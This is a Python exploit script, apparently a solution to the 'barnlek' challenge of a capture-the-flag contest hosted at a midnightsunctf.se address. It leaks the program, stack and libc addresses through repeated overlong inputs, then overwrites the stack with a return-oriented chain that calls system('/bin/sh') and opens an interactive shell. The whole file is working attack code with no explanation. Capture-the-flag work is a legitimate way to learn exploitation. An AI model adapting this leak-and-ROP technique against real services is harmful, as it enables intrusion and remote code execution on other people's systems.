#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './barnlek'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'pwn3.midnightsunctf.se', 'port':12345})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc.so.6')
env.select()

#==========

binf = ELF(bin_file)

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_io_overflow = 0x7a730

#==========

def attack(conn):
    conn.sendlineafter('input: ', 'a'*0x17+'!')
    conn.recvuntil('reverse: ')
    binf.address            = u(conn.recvuntil('!', drop=True)[::-1]) - 0xdd8
    addr_bss                = binf.sep_section['.bss']
    addr_buf                = addr_bss + 0x100
    addr_rdi                = binf.address + 0x00000db3
    info('addr_bin_base     = 0x{:08x}'.format(binf.address))

    conn.sendlineafter('input: ', 'a'*0x1f+'!')
    conn.recvuntil('reverse: ')
    addr_stack_buf          = u(conn.recvuntil('!', drop=True)[::-1]) - 0x1d0
    info('addr_stack_buf    = 0x{:08x}'.format(addr_stack_buf))

    conn.sendlineafter('input: ', 'a'*0x27+'!')
    conn.recvuntil('reverse: ')
    addr_libc_io_overflow   = u(conn.recvuntil('!', drop=True)[::-1]) - 0xeb
    libc.address            = addr_libc_io_overflow - offset_libc_io_overflow
    addr_libc_system        = libc.sep_function['system']
    addr_libc_str_sh        = next(libc.search('/bin/sh'))
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))

    conn.sendlineafter('input: ', ('a'*0x98+p64(addr_stack_buf-8)).split('\xff')[0])

    exploit  = p64(addr_rdi)
    exploit += p64(addr_libc_str_sh)
    exploit += p64(addr_libc_system)
    conn.sendlineafter('input: ', exploit)

#==========

if __name__=='__main__':
    conn = communicate(env.mode, **env.target)
    attack(conn)
    conn.interactive()
    
#==========
